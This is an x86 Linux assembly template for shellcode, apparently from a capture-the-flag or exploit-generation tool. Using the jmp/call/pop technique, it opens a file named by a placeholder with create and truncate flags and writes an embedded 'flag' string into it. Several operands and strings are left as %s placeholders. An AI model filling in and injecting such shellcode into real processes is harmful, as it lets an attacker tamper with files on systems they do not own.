section .text
global _start
_start:
    jmp path
open:
; open(path, 0 , 0)
    xor eax, eax
    mov ebx, [esp]
    mov cx, 0x241
    mov dx, 0x1a0
    mov al, 0x5
    int 0x80
    mov ebx, eax
    jmp flag
copy:
    mov esi, [esp]
    mov edi, esp
    xor ecx, ecx
loop:
    mov al, [esi + ecx]
    mov [edi + ecx], al
    inc ecx
    cmp ecx, %s
    jne loop
    xor edx, edx
    mov [edi + ecx], dl
write:
; write(fd, esp, 32)
    push esp
    mov ecx, [esp]
    mov al, 0x4
    mov %s, %s
    int 0x80
end:
    xor ebx, ebx
    mov al, 0x1
    int 0x80

flag:
    call copy
    db "%s"

path:
    call open
    db "%s", 0

nop:
    nop
    nop
    nop
    nop
